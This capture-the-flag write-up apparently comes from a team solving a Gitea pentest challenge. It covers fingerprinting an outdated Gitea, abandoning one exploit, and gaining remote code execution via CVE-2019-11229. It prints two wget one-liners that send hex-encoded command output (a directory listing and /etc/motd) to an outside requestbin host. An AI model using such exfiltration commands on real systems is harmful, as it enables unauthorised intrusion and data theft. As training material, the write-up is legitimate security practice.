# Tea time

## Pentest, 20 points

### Description

We lost access to our versioning server, the attacker removed our ssh keys. Please get it back and connect to the server using SSH to get the flag.

by Masterfox

### Solution

This challenge was only reachable within a specific network. We could access Tea time only through a machine we compromised from a previous challenge, only with a command-line interface then, at first. After a few minutes, to be more comfortable, we designed some `iptables` rules according to https://www.ired.team/offensive-security/red-team-infrastructure/redirectors-forwarders, to access from our browsers, the challenge.

First, we identify the version of Gitea with its commit: we can notice `Gitea Version: 73ce024` on the footer's page. We find Gitea's version then which is `1.8.0 RC2` with this commit https://github.com/go-gitea/gitea/commit/73ce02400cec659bd7a7ee3798ff73a4c7c85957. We notice that this version was released on 27th March 2019, which is quite old. There is probably some exploits that we can use!

We first looked at one from Podalirius (https://www.exploit-db.com/exploits/49571) presented in his article https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/. After some tries, we realized that we couldn't use this exploit as our Gitea's configuration didn't enable `Git hooks` by users.

Back to square one, we are searching for another exploit. Thanks to https://www.cvedetails.com/ we found the `CVE-2019-11229` which enables code execution, this is interesting.

Thanks to https://www.exploit-db.com/exploits/49383, https://medium.com/@knownsec404team/analysis-of-cve-2019-11229-from-git-config-to-rce-32c217727baa and some manual crafting, notably to modify the exploit as the originally designed server was not working fine, we had a RCE on the Tea time machine. Though, we had to design a specific exfiltration technique to retrieve some information from our executed commands. To list files and directories, we could do for instance the following command:
```bash
wget http://requestbin.net/r/xxx?x=$(ls | xxd -p | tr -d '\\n')
```

Okay, we have RCE, now focus back on the challenge and on what we are looking for. We thought that the flag was prompted when logging in through SSH in the SSH banner. Then, after reading some documentation such as https://www.tecmint.com/protect-ssh-logins-with-ssh-motd-banner-messages/ we dumped `/etc/motd` content:
```bash
wget http://requestbin.net/r/xxx?x=$(cat /etc/motd | xxd -p | tr -d '\\n')
```

Which contained the flag `NORZH{k33p_upd4t1ng_3Veryd4y}`